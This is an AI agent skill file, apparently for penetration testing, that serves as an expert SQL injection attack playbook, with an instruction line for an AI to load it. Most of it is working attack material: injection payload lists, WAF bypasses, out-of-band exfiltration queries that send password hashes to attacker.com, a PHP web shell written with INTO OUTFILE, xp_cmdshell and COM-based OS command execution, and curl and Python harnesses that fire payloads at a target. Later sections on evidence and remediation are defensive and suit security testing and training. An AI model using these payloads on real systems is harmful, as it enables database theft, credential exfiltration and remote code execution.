---
name: sqli-sql-injection
description: >-
  SQL injection playbook. Use when input reaches SQL queries, authentication logic, sorting, filtering, reporting, or DB-specific blind and out-of-band execution paths.
---

# SKILL: SQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Advanced SQLi techniques. Assumes basic UNION/error/boolean-blind fundamentals known. Focuses on: per-database exploitation, out-of-band exfiltration, second-order injection, parameterized query bypass scenarios, filter evasion, and escalation to OS. For real-world CVE cases, SMB/DNS OOB exfiltration, INSERT/UPDATE injection patterns, and framework-specific exploitation (ThinkPHP, Django GIS), load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the backend is **Java with Jackson** and your SQL keywords are WAF-blocked — Jackson's `charToHex` table is indexed by `ch & 0xFF`, so a Unicode character like `丰` (U+4E30) resolves to hex digit `0` inside a `\uXXXX` escape sequence, letting you smuggle `UNION`, `SELECT`, `1`, etc. without the WAF ever seeing them

## 1. QUICK START

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- SMB out-of-band exfiltration via `LOAD_FILE` + UNC paths (Windows MySQL)
- KEY injection / URI injection / non-parameter injection points
- INSERT/DELETE/UPDATE statement injection differences
- ThinkPHP5 array key injection (`updatexml` error-based)
- Django GIS Oracle `utl_inaddr.get_host_name` CVE
- ORDER BY / LIMIT injection techniques

### Advanced Reference

Also load [SQLMAP_ADVANCED.md](./SQLMAP_ADVANCED.md) when you need:
- SQLMap tamper scripts matrix and WAF bypass tamper chain recipes (space2comment, between, charencode, etc.)
- `--technique`, `--risk`/`--level` combinations and `--second-url` for second-order injection
- `--os-shell` / `--os-pwn` OS-level exploitation via SQLMap
- INSERT/UPDATE/DELETE injection patterns with data exfiltration examples
- GraphQL + SQL injection (batched queries, nested field injection, mutation injection)
- DB-specific advanced functions: PostgreSQL dollar-sign quoting, MSSQL linked servers, Oracle DBMS_PIPE/DBMS_SCHEDULER

If you have only confirmed a suspicious SQL sink, do not load extra payload skills first; complete first-pass validation here.

### First-pass payload families

| Situation | Start With | Why |
|---|---|---|
| Login or boolean branch | `' or 1=1--` | Fast signal on auth or conditional checks |
| Numeric parameter | `1 or 1=1` | Avoid quote dependency |
| ORDER BY / sorting | `1,2,3` then `1 desc--` | Good for structural probing |
| Visible SQL errors | `'` then DBMS-specific error probes | Error text gives DBMS clues |
| No visible output | time-based payloads | Stable fallback for blind targets |
| Heavy filtering / WAF | polyglot or whitespace-free variants | Expands parser confusion surface |

### Small, stable first-pass set

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### DBMS routing hints

| Clue | Likely DBMS | Good Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | try `SLEEP()` and `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | try `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | try `pg_sleep()` |
| `ORA-` prefix | Oracle | pivot to out-of-band or XML features |
| SQLite errors, local apps | SQLite | focus on boolean/UNION and file-backed behavior |

---

### DETECTION — SUBTLE INDICATORS

Most SQLi is found by **behavioral differences**, not errors:

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| Numeric: `1` vs `1-1` vs `2-1` returns same | Arithmetic evaluated |
| `1=1` vs `1=2` in condition changes result | Boolean-based injection |
| SELECT with ORDER BY N: column count enumeration | UNION prep |
| Time delay: `'; WAITFOR DELAY '0:0:5'--` | Blind/time-based |
| 500 error on `'`, 200 on `''` | Unhandled exception = SQLi |
| Different HTTP response size | Boolean blind indicator |

**Critical**: test in ALL parameter types — URL query, POST body, JSON fields, XML values, HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie values).

---

## 2. DATABASE FINGERPRINTING

```sql
-- MySQL
VERSION()              -- returns version string
@@datadir              -- data directory
@@global.secure_file_priv  -- file read restriction

-- MSSQL
@@VERSION              -- includes "Microsoft SQL Server"
DB_NAME()              -- current database
USER_NAME()            -- current user

-- Oracle
v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name      -- current db (alternative)
user                   -- current Oracle user

-- PostgreSQL
version()              -- returns version
current_database()     -- current db
current_user           -- current user
```

**Error-based fingerprint**: inject `'` and read error message format. MySQL errors differ from Oracle/MSSQL.

---

## 3. UNION-BASED DATA EXTRACTION

**Column count determination**:
```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY N--   ← until error = N-1 columns
```

**Column type detection** (NULL is safest):
```sql
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--  ← find string column
```

**Database-specific string concat** (required when column accepts only int):
```sql
-- MySQL
CONCAT(username,0x3a,password)

-- MSSQL
username+'|'+password

-- Oracle
username||'|'||password

-- PostgreSQL
username||':'||password
```

---

## 4. BLIND INJECTION — INFERENCE TECHNIQUES

### Boolean Blind (conditional response difference)
```sql
-- Does first char of username = 'a'?
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--

-- Oracle
' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--
```

### Time-Based Blind (no response difference)
```sql
-- MSSQL (most reliable)
'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--

-- MySQL
' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
-- Oracle sleep alternative (no SLEEP):
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 5. OUT-OF-BAND (OOB) EXFILTRATION — CRITICAL

Use when blind injection has no time/boolean indicator, or when batch queries can't return data inline.

### MSSQL — OpenRowSet (requires SQLOLEDB, outbound TCP)
```sql
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) VALUES (@@version)--

-- Exfiltrate table data:
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) SELECT TOP 1 username+':'+password FROM users--
```
Use **port 80 or 443** to bypass firewall egress restrictions.

### Oracle — UTL_HTTP (HTTP GET with data in URL path)
```sql
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```
Oracle's UTL_HTTP supports proxy — can exfil through corporate proxy!

### Oracle — UTL_INADDR (DNS exfiltration — often bypasses HTTP restrictions)
```sql
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```
Attacker sees: `HASH_VALUE.attacker.com` DNS query → read password hash.

### Oracle — UTL_SMTP / UTL_TCP
```sql
-- Email large data dumps:
UTL_SMTP.SENDMAIL(...)  -- send query results via email

-- Raw TCP socket:
UTL_TCP.OPEN_CONNECTION('attacker.com', 80)
```

### MySQL — DNS via LOAD_FILE (Windows + UNC path)
```sql
SELECT LOAD_FILE('\\\\attacker.com\\share')
-- Triggers DNS lookup before connection attempt
-- Works on Windows hosts with outbound SMB
```

### MySQL — INTO OUTFILE (in-band filesystem write)
```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
-- Requirements: FILE privilege, writable web root, secure_file_priv=''
```

---

## 6. ESCALATION — OS COMMAND EXECUTION

### MSSQL — xp_cmdshell (if enabled, or if sysadmin)
```sql
'; EXEC xp_cmdshell('whoami')--

-- Enable if disabled (requires sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

### MySQL — UDF (User Defined Functions)
Write malicious shared library to filesystem, then `CREATE FUNCTION ... SONAME`.

### Oracle — Java Stored Procedures
```sql
-- Create Java class:
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
-- Then exec OS commands via Java Runtime
```

---

## 7. SECOND-ORDER INJECTION

**Concept**: User input is stored safely (parameterized), but later **retrieved as trusted data** and concatenated into a new query without re-sanitization.

**Example attack flow**:
1. Register username: `admin'--`
2. Application safely inserts this into users table
3. Password change function fetches username from session (trusted!) and builds:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Comment strips the condition → updates **admin's** password

**Key insight**: Any application function that reads stored data and uses it in a new DB query is a second-order candidate. Review: password change, profile update, admin action on user data.

---

## 8. PARAMETERIZED QUERY BYPASS SCENARIOS

Parameterized queries do NOT prevent SQLi when:

1. **Table/column names are user-controlled** — params can't parameterize identifiers:
   ```sql
   -- UNSAFE even with params:
   "SELECT * FROM " + tableName + " WHERE id = ?"
   ```
   Mitigation: whitelist-validate table/column names.

2. **Partial parameterization** — some fields concatenated, others parameterized:
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"
   -- userType not parameterized → injection
   ```

3. **IN clause** with dynamic count (common mistake in ORMs):
   ```sql
   SELECT * FROM items WHERE id IN (1, 2, ?)  -- only last is parameterized
   ```

4. **Second-order** — data retrieved from DB assumed clean, re-used in query without params.

---

## 9. FILTER EVASION TECHNIQUES

### Comment Injection (break keywords)
```sql
SEL/**/ECT
UN/**/ION
1 UN/**/ION ALL SEL/**/ECT NULL--
```

### Case Variation
```sql
UnIoN SeLeCt
```

### URL Encoding
```sql
%55NION  -- U
%53ELECT -- S
```

### Whitespace Alternatives
```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- tab
SELECT%0ausername%0aFROM%0ausers  -- newline
```

### String Construction (bypass literal-string detection)
```sql
-- MySQL concatenation without quotes:
CHAR(117,115,101,114,110,97,109,101)  -- 'username'

-- Oracle:
CHR(117)||CHR(115)||CHR(101)||CHR(114)

-- MSSQL:
CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)
```

---

## 10. DATABASE METADATA EXTRACTION

### MySQL
```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### MSSQL
```sql
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'  -- user tables
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
```

### Oracle
```sql
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username,password FROM dba_users  -- requires DBA
```

### PostgreSQL
```sql
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## 11. STORED PROCEDURE ABUSE

### MSSQL — sp_OAMethod (COM automation)
```sql
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'
```

### Oracle — DBMS_LDAP (outbound LDAP = DNS exfil)
```sql
SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',389) FROM dual
```

---

## 12. QUICK REFERENCE — INJECTION TEST STRINGS

```
'                          -- break string context
''                         -- escaped quote (test handling)
' OR 1=1--                 -- auth bypass attempt  
' OR 'a'='a               -- alternate auth bypass
'; SELECT 1--             -- statement termination
' UNION SELECT NULL--     -- UNION test
' AND 1=1--               -- boolean true
' AND 1=2--               -- boolean false (different response → injectable)
1; WAITFOR DELAY '0:0:3'-- -- MSSQL time delay
1 AND SLEEP(3)--          -- MySQL time delay
1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle time delay
```

---

## 13. WAF BYPASS MATRIX

| Technique | Blocked | Bypass |
|---|---|---|
| Space filtered | `SELECT * FROM` | `SELECT/**/*//**/FROM`, `SELECT%0a*%0aFROM` |
| Comma filtered | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| Quote filtered | `'admin'` | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| OR/AND filtered | `OR 1=1` | <code>&#124;&#124;1=1</code>, `&&1=1`, `DIV 0` |
| = filtered | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| SELECT filtered | | Use `handler` (MySQL), `PREPARE`+hex, or stacked queries |
| information_schema filtered | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |

Additional WAF bypass patterns:

- Polyglot: `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`
- Routed injection: `1' UNION SELECT 0x(inner_payload_hex)-- -` where inner payload is another full query hex-encoded
- Second Order: inject into storage, trigger when data is used in another query later
- PDO emulated prepare: when `PDO::ATTR_EMULATE_PREPARES=true`, stacked queries work even with parameterized-looking code

---

## 14. WAF BYPASS — DETAILED EVASION PRIMITIVES

### No-Space Bypass
```sql
SELECT/**/username/**/FROM/**/users
SELECT(username)FROM(users)
```

### No-Comma Bypass
```sql
-- UNION with JOIN instead of comma:
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- SUBSTRING alternative: SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT alternative: LIMIT 1 OFFSET 0
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- First query returns string used as input to second query:
' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--
-- The returned value becomes part of another SQL context
```

### Second-Order Injection
```
-- Step 1: Register username: admin'--
-- Step 2: Trigger password change (uses stored username in SQL)
-- UPDATE users SET password='new' WHERE username='admin'--'
```

### PDO / Prepared Statement Edge Cases
```php
// Unsafe even with PDO when query structure is dynamic:
$pdo->query("SELECT * FROM " . $_GET['table']);
// Or when using emulated prepares with multi-query:
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
```

### Entry Point Detection (Unicode tricks)
```
U+02BA ʺ (modifier letter double prime) → "
U+02B9 ʹ (modifier letter prime) → '
%%2727 → %27 → '
```


---

## 15. CONFIRMING THE FINDING — PARSE-BREAKING, NOT ERROR TEXT

A SQL injection claim is confirmed when **your predicate changes the result**, not when the page
returns a database error. Error strings are the most common false positive in this class: an
unhandled quote reaches the handler and produces a 500 with no injection behind it.

| Step | Question | What it proves |
|---|---|---|
| 1 | Does `'` differ from `''` in body, status, or length? | the quote reaches a string literal, not a sanitizer |
| 2 | Does `1=1` vs `1=2` change the **result set** (not just the error)? | a boolean is being evaluated by the engine |
| 3 | Does `ORDER BY N` fail at a specific N and succeed at N-1? | column count is real, the query is being concatenated |
| 4 | Does a time payload produce a **stable delay** across repeats? | blind execution with no inference from output |
| 5 | Does an OOB payload produce a **callback** carrying your token? | execution with no channel back through the app |
| 6 | Is the behaviour repeatable in a **fresh session** with the same DB state? | not caching, not a one-off state artefact |

**Prefer arithmetic and predicates to error-inducing payloads.** `1` vs `1-1` vs `2-1`, and
`AND 1=1` vs `AND 1=2`, prove the engine is evaluating your expression. Comment-closing payloads
(`-- `, `#`, `/* */`) only prove the parser encountered your bytes.

**Measure the boolean, not the byte count.** Response length changes by a few bytes on unrelated
content all the time. Pick a marker that must appear or disappear (a row, a product, a username),
and confirm that the *same* request with the *opposite* boolean reliably flips it.

**Timing must clear the noise floor.** Take at least five samples of the control and of the payload,
and report the medians and the spread. `SLEEP(5)` against a 0.2s baseline with 0.1s variance is
evidence; a single slow response is not. Enable `--technique`-specific retries so a flake cannot
become a finding.

**State the sink, the context, and the bypass.** Report "the `sort` parameter is concatenated into
the `ORDER BY` clause of a MySQL query in `ReportDao.java:88`, so a boolean-blind predicate on
`information_schema` is evaluated", never "the parameter is vulnerable to SQL injection".

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| A generic `500` on `'` with no behavioural difference on `''` | the handler is fragile; no parse break was proven |
| Error text stored in a canned error page or WAF template | a static string, not the DBMS speaking |
| `'` returns `200` and `''` returns `200` with identical body | no observable difference to work with yet |
| Delay present with a **syntactically inert** payload of same length | processing cost, not `SLEEP()` |
| Delay appears once and never reproduces | likely a flake; re-run before reporting |
| UNION returns the *same* row count as the original query | your SELECT was not injected; the engine ignored it |
| `ORDER BY` failure at N caused by a **nonexistent column name** the app already used | pre-existing bug, not injection |
| Login success with `' or 1=1--` against a **non-SQL** auth path | the stub authenticates everything; test a wrong password as control |
| CORS preflight or an auth redirect returning `403` for all inputs | the WAF or proxy answered; the query never ran |
| Parameterized endpoint returning an error on quotes | the bind layer is working as designed |

**Always run the negative control.** Send the same request with a value that must be false
(`AND 1=2`, or a nonexistent row) and confirm the result flips. If both branches behave identically,
you have a response difference that is not a predicate.

---

## 16. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact request** — parameter, raw payload, encoding, headers, cookies, HTTP method | the bypass is byte-exact; `%27` and `'` are different findings |
| The **true/false pair** of responses with status, size, and the differing field highlighted | the predicate is the proof, not the error |
| The **DBMS fingerprint** (`@@version`, `v$version`, `version()`) and how you derived it | fixes which payload family and which metadata tables apply |
| The **inferred schema** with the exact query that produced it (`information_schema` output) | shows real data extraction, not a guess |
| The **timing series** for blind cases — N samples of control and payload, medians and spread | converts a slow response into a measurement |
| The **OOB callback log** (DNS/HTTP/LDAP) with source IP, timestamp, and your embedded token | proves execution and identifies the egress path |
| The **sink code** with file path and line — the concatenation that carries the parameter | the finding is the sink; severity follows reachable data |
| The **authentication/data boundary crossed** (which table, whose rows, how many) | converts "injectable" into an impact statement |
| **Negative control** — the opposite boolean shows the inverse result | mandatory; see §15 |
| Whether the channel is **in-band, inferential, or out-of-band** | tells the reader how to reproduce your claim |

**The true/false pair plus the extracted row is the finding.** "The `id` parameter is concatenated into
`SELECT ... WHERE id = '$id'` in `SearchService.cs:141`, and `UNION SELECT ... FROM users` returned
`admin:$2y$10$...`" is a report. "SQL injection in the search box" is not.

**Scope the data before you claim severity.** A boolean that confirms injectability but extracts
nothing is a different severity from a UNION that dumps the `users` table, and a DBA-level OOB
exfil is different again. Name the table, the row count, and the privilege level of the connection.

---

## 17. REMEDIATION REFERENCE

1. **Parameterize every value, everywhere, in every query** — prepared statements with bound
   parameters (`?` / `:name`) in the driver's native API. This is the fix that removes the class;
   escaping is not equivalent, because escaping correctness depends on the charset, the driver, and
   the connection settings.
2. **Never concatenate identifiers — allowlist them** — table names, column names, `ORDER BY` fields,
   and `LIMIT`/`OFFSET` directions cannot be bound. Validate them against a fixed map from a client
   token to a server-side identifier (`?sort=created` → a literal column). Anything else is
   injectable no matter how the values are handled.
3. **Turn off emulated prepares and multi-statement queries** — `PDO::ATTR_EMULATE_PREPARES = false`,
   MySQL `CLIENT_MULTI_STATEMENTS` off, MSSQL `MultipleActiveResultSets` reviewed. Emulated prepares
   reintroduce the concatenation they were supposed to remove.
4. **Use a least-privilege database account per application** — no `FILE`, no `SUPER`, no
   `xp_cmdshell` execute, no `CREATE FUNCTION`, no broad `SELECT` on `mysql.*` or `information_schema`
   beyond what the app needs. This is the control that turns a dump into a limited read.
5. **Deny outbound network egress from the database host** — OOB exfiltration (DNS, UNC, UTL_HTTP,
   DBMS_LDAP) requires the DB to reach the internet; a firewall rule closes the channel even when the
   injection exists.
6. **Disable the dangerous stored procedures and components** — `xp_cmdshell`, `sp_OACreate`,
   `OPENROWSET` with SQLOLEDB, MySQL UDF loading, Oracle Java stored procedures and `UTL_*` packages
   unless a documented business need exists.
7. **Handle SQL errors without leaking them** — a generic error page removes the error-based channel
   and the schema hints it provides, but it does **not** fix a boolean, timing, or OOB channel; never
   treat error suppression as remediation on its own.
8. **Canonicalize and validate typed input before the query** — an id is an integer, an email matches
   a pattern, a date parses as a date. Type enforcement at the boundary closes the paths that
   string-based filters miss, including Unicode and overlong-encoding tricks.
9. **Add a WAF rule set as defence in depth, not as the fix** — signature rules reduce the volume of
   automated attempts and are trivially bypassed by encoding and comment insertion (§13, §14); do not
   report a WAF as remediation.
10. **Log and alert on injection-shaped requests** — quote-plus-comment sequences, `UNION SELECT`,
    `SLEEP(`, `WAITFOR DELAY`, `pg_sleep`, and repeated boolean toggles from one session are
    high-signal; alert on the pattern, not on a single character.
11. **Run a two-mode test suite in CI** — a schema-diff test plus a replay of §12's probe list against
    every parameter on every build. This class regresses whenever a query builder, an ORM, or a
    reporting module is refactored.
12. **Fix second-order paths explicitly** — stored values must be treated as untrusted every time
    they are re-read into a new query; a stored-procedure or trigger that concatenates a stored
    username is the same bug in a less visible place (§7).

---

## 18. EXECUTION PRIMITIVES

SQL injection is proven by **a value read out of the database that you could not otherwise obtain**,
or by a response differential that is reproducible and large compared to its own variance.

### 19.1 The control, and the smallest possible differential

```bash
T="https://target.tld"
# control: the legitimate value
curl -sS -o /tmp/c0 -w 'control  %{http_code} %{size_download}\n' "$T/product?id=1"
# a single quote: the cheapest probe, and it must be compared against the control
curl -sS -o /tmp/c1 -w 'quote    %{http_code} %{size_download}\n' "$T/product?id=1'"
diff <(head -c 400 /tmp/c0) <(head -c 400 /tmp/c1) >/dev/null && echo "IDENTICAL - no injection signal" || echo "DIFFERS"
grep -oiE 'sql syntax|mysql_|pg_query|ORA-[0-9]+|SQLite3::|unclosed quotation' /tmp/c1 | head -3
# and the arithmetic pair, which is the boolean test that survives most filters
for V in '1' '2-1' '3-2' '1+0' '1*1' ; do
  R=$(curl -sS -o /tmp/ar -w '%{size_download}' "$T/product?id=$V")
  printf '%-8s size=%s\n' "$V" "$R"
done
```

**A database error naming the driver, or two expressions that evaluate to the same value and produce
the same page, is the entry ticket.** The arithmetic pair is stronger than a bare quote because it
controls for the string `'s` simply being unknown.

### 19.2 The boolean differential, measured not eyeballed

```bash
# a true/false pair against the same endpoint, repeated to establish variance
for i in 1 2 3; do
  T1=$(curl -sS -o /tmp/t1 -w '%{size_download}' "$T/product?id=1 AND 1=1")
  F1=$(curl -sS -o /tmp/f1 -w '%{size_download}' "$T/product?id=1 AND 1=2")
  printf 'trial %s: TRUE=%s FALSE=%s\n' "$i" "$T1" "$F1"
done
# the delta must be large against the noise floor, or the test is not a signal
python3 - <<'PY'
print("report TRUE and FALSE distributions and the delta; a delta inside the noise floor is not a finding")
PY
```

**Report the distributions, not a single pair.** A size delta of 3 bytes across three trials is
jitter; a delta of 4,000 bytes that reproduces every time is the boolean primitive.

### 19.3 UNION-based extraction, done minimally

```bash
# find the column count with ORDER BY, then with a NULL list, then locate the string column
for N in 1 2 3 4 5 6 7 8 9 10; do
  R=$(curl -sS -o /dev/null -w '%{http_code}' "$T/product?id=1 ORDER BY $N")
  printf 'ORDER BY %-3s %s\n' "$N" "$R"
done
# then a UNION that puts a single marker in every column
COL=$(python3 -c "print(','.join(['NULL']*4))")
curl -sS -o /tmp/u -w 'union %{http_code}\n' --get \
  --data-urlencode "id=0 UNION SELECT $COL" "$T/product"
grep -c 'YOUR_MARKER' /tmp/u
# once the column is found, read exactly what proves the primitive
curl -sS -o /tmp/u2 --get --data-urlencode "id=0 UNION SELECT 1,version(),3,database()" "$T/product"
grep -oE '[0-9]+\.[0-9]+\.[0-9]+|^[a-z_]+$' /tmp/u2 | head -4
```

Read **`version()`, `current_user()`, and one column from one table**, then stop. The finding is the
injection plus the reach; enumerating the schema is not required and is a scope failure.

### 19.4 Blind inference: time-based, with the control

```bash
# the control run, three times, before the payload
base() { curl -sS -o /dev/null -w '%{time_total}' --get --data-urlencode "id=$1" "$T/product"; }
echo "--- control"; for i in 1 2 3; do base "1"; echo; done
# the time payload, three times - the delta must reproduce
for i in 1 2 3; do base "1 AND SLEEP(5)"; echo; done
# the dialect-specific variants, since the sleep function is not portable
for P in '1 AND SLEEP(5)' '1;SELECT pg_sleep(5)' "1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1" \
         "1 AND 1=1 WAITFOR DELAY '0:0:5'" "1 AND randomblob(100000000) IS NOT NULL" ; do
  printf '%-56s %s\n' "$P" "$(base "$P")"
done
```

The measured delta, repeated, **is** the boolean primitive when nothing is reflected. Use a sleep of
5 seconds rather than 10 - short enough to iterate, long enough to exceed jitter.

### 19.5 Out-of-band exfiltration, when blind and time-based are both blocked

```bash
SUB="sqli-$(date +%s).YOUR_COLLAB_DOMAIN"
# MySQL, via a UNC path or a DNS lookup
curl -sS -o /dev/null --get --data-urlencode \
  "id=1 AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.$SUB\\\\a'))" "$T/product"
# MSSQL, which is the classic OOB channel
curl -sS -o /dev/null --get --data-urlencode \
  "id=1; EXEC master..xp_dirtree '\\\\$SUB\\a'" "$T/product"
# Oracle, via UTL_HTTP or UTL_INADDR
curl -sS -o /dev/null --get --data-urlencode \
  "id=1 AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.$SUB')=1" "$T/product"
# PostgreSQL, via the copy-from-program or dblink surface
curl -sS -o /dev/null --get --data-urlencode "id=1; COPY (SELECT '') TO PROGRAM 'nslookup $SUB'" "$T/product"
echo "check the collaborator - the subdomain itself contains the exfiltrated value"
```

**The callback, with data embedded in the hostname, is the strongest evidence in this domain.** It
proves evaluation, proves the data reached the network, and works with no output channel at all.

### 19.6 WAF and filter bypass, always paired with the blocked control

```bash
# the control: the unmodified payload, which must be shown as blocked
curl -sS -o /tmp/w0 -w 'unmodified %{http_code} %{size_download}\n' --get \
  --data-urlencode "id=1 UNION SELECT 1,2,3" "$T/product"
# and the bypass variants, each measured against it
for P in '1/**/UNION/**/SELECT/**/1,2,3' '1 UnIoN SeLeCt 1,2,3' '1%09UNION%09SELECT%091,2,3' \
         '1 UN/**/ION SEL/**/ECT 1,2,3' '1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3' \
         '1 UNION ALL SELECT 1,2,3' '1 UNION DISTINCT SELECT 1,2,3' ; do
  R=$(curl -sS -o /tmp/w -w '%{http_code} %{size_download}' --get --data-urlencode "id=$P" "$T/product")
  printf '%-44s %s\n' "$P" "$R"
done
```

**The pair is the finding**: the payload in its plain form blocked, the comment-interleaved form
executing. A bypass without the blocked control is an unproven claim.

### 19.7 Second-order and stored injection

```bash
# where the injection lands in storage and fires later
curl -sS -o /tmp/s1 -w 'store %{http_code}\n' -X POST "$T/profile" \
  -H 'Content-Type: application/json' -H "Cookie: $SESSION" \
  -d "{\"displayName\":\"tester'||(SELECT version())||'\"}"
# then find the page that renders it - the injection fires at read time, not write time
for P in /profile /me /admin/users /export /report; do
  R=$(curl -sS -o /tmp/s2 -w '%{size_download}' "$T$P" -H "Cookie: $SESSION")
  printf '%-16s %s\n' "$P" "$R"
done
grep -oE '[0-9]+\.[0-9]+\.[0-9]+' /tmp/s2 | head -2
echo "the version string appearing on a page that never took the injection as input is the proof"
```

Second-order injection is **proven at the read**, not the write. Capture both requests, and state
which page rendered the injected value.

### 19.8 A stopped-on-first-success harness

```bash
python3 - <<'PY'
import urllib.request, urllib.parse, time, re
T="https://target.tld/product"
def get(q):
    u=T+"?"+urllib.parse.urlencode({"id":q}); s=time.time()
    try:
        r=urllib.request.urlopen(u,timeout=25); return r.status,r.read().decode(errors="ignore"),time.time()-s
    except Exception as e:
        return getattr(e,"code",None),"",time.time()-s

checks=[
 ("control",            "1",                        lambda c,b,t: True),
 ("error-based",        "1'",                       lambda c,b,t: bool(re.search(r'sql syntax|ORA-|pg_query',b,re.I))),
 ("boolean-true",       "1 AND 1=1",                None),
 ("boolean-false",      "1 AND 1=2",                None),
 ("union",              "0 UNION SELECT 1,version(),3", lambda c,b,t: bool(re.search(r'\d+\.\d+\.\d+',b))),
 ("time-based",         "1 AND SLEEP(5)",           lambda c,b,t: t>4),
]
res={}
for name,q,f in checks:
    for _ in range(2):
        c,b,t=get(q)
    res[name]=(c,len(b),round(t,2), bool(f(c,b,t)) if f else None)
    print(f"{name:14} status={c} size={len(b):6} t={t:5.2f} evidence={res[name][3]}")
print()
print("report ONLY the rows with evidence=True, each with its raw response")
PY
```

**Each primitive is reported separately, with its own captured response.** A report that claims
"SQL injection" from an error message alone, with no boolean or extraction, is the narasi failure
this package exists to prevent.

---

---

## 19. RELATED SIBLINGS - LOAD TOGETHER
- [vuln-research-methodology](../vuln-research-methodology/SKILL.md) — triage, reproducibility bar, and write-up format for an injection finding
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — how DBMS, scope, and extracted data are framed in a report
- [injection-checking](../injection-checking/SKILL.md) — the P1 router that decides whether this is a database sink or another interpreter
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) — Jackson `charToHex` lookup truncation used to smuggle blocked SQL keywords past a WAF
- [nosql-injection](../nosql-injection/SKILL.md) — the sibling injection class when the store is Mongo or a document DB
- [type-juggling](../type-juggling/SKILL.md) — loose comparison behaviour that turns a stored value into an authentication bypass
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — what `xp_cmdshell`, UDF, and `UTL_HTTP` escalation reaches once SQL execution is confirmed
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — the read primitive that pairs with `INTO OUTFILE` and `LOAD_FILE` in a write chain
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — the alternative route to code execution in the same Java stacks
